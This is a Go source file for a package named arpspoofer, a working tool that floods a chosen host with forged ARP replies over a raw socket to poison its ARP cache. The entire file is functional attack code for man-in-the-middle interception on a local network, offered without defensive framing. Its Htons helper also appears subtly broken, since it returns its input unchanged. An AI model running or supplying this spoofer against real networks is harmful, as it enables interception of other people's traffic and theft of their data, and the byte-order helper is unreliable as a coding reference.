// Package arpspoofer is used to spoof a particular host with unsolicited arp replies to poison their arp cache.
package arpspoofer

import (
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/pterm/pterm"
	"golang.org/x/sys/unix"
)

var packetCount = 0

func Spoof(target net.IP, targetMac net.HardwareAddr, source net.IP, sleepDuration time.Duration) error {
	iface, err := getIfaceByIP(target)
	if err != nil {
		return err
	}
	fmt.Printf("Spoofing host %v on interface %v\n", target.String(), iface.Name)

	notifyChan := make(chan struct{})
	go awaitSignal(notifyChan)
	ctx, cancel := context.WithCancel(context.Background())

	go func() {
		<-notifyChan
		cancel()
	}()

	err = sendArpPackets(ctx, iface, &source, &target, &targetMac, sleepDuration)
	if err != nil {
		return err
	}
	return nil
}

func getIfaceByIP(IPAddr net.IP) (*net.Interface, error) {
	allIfaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	for _, iface := range allIfaces {
		addrs, err := iface.Addrs()
		if err != nil {
			return nil, err
		}
		for _, addr := range addrs {
			addr, ok := addr.(*net.IPNet)
			if !ok {
				return nil, fmt.Errorf("error parsing Interface IP address")
			}
			if addr.Contains(IPAddr) {
				return &iface, nil
			}
		}
	}

	return nil, fmt.Errorf("no interface connected to that network")
}

func sendArpPackets(ctx context.Context, iface *net.Interface, srcIP *net.IP, dstIP *net.IP, dstMac *net.HardwareAddr, sleepDuration time.Duration) error {
	sockfd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, Htons(unix.ETH_P_ARP))
	if err != nil {
		return err
	}
	sockAddr := &unix.SockaddrLinklayer{
		Ifindex:  iface.Index,
		Protocol: uint16(Htons(unix.ETH_P_ARP)),
	}

	eth := &layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       *dstMac,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := &layers.ARP{
		Operation:       layers.ARPReply,
		AddrType:        layers.LinkTypeEthernet,
		Protocol:        layers.EthernetTypeIPv4,
		HwAddressSize:   6,
		ProtAddressSize: 4,

		SourceHwAddress:   iface.HardwareAddr,
		SourceProtAddress: srcIP.To4(),

		DstHwAddress:   *dstMac,
		DstProtAddress: dstIP.To4(),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: false,
	}

	err = gopacket.SerializeLayers(buf, opts, eth, arp)
	if err != nil {
		return err
	}

	packetBytes := buf.Bytes()

	// setup for ui area to show packet count
	area, err := pterm.DefaultArea.Start(pterm.Sprintf("Packets Sent: %v", packetCount))
	if err != nil {
		return err
	}

	for {
		select {
		case <-ctx.Done():
			area.Stop()
			return nil
		default:
			err = unix.Sendto(sockfd, packetBytes, 0, sockAddr)
			if err != nil {
				return err
			}
			packetCount++
			area.Update(pterm.Sprintf("Packets Sent: %v", packetCount))
			time.Sleep(sleepDuration)
		}
	}
}

func Htons(num int) int {
	var b [4]byte
	binary.BigEndian.PutUint32(b[:], uint32(num))
	return int(binary.BigEndian.Uint32(b[:]))
}

func awaitSignal(notifyChan chan struct{}) {
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, os.Interrupt)

	<-signalChan
	fmt.Printf("\n\nTotal Packets Sent: %v\n", packetCount)
	notifyChan <- struct{}{}
}
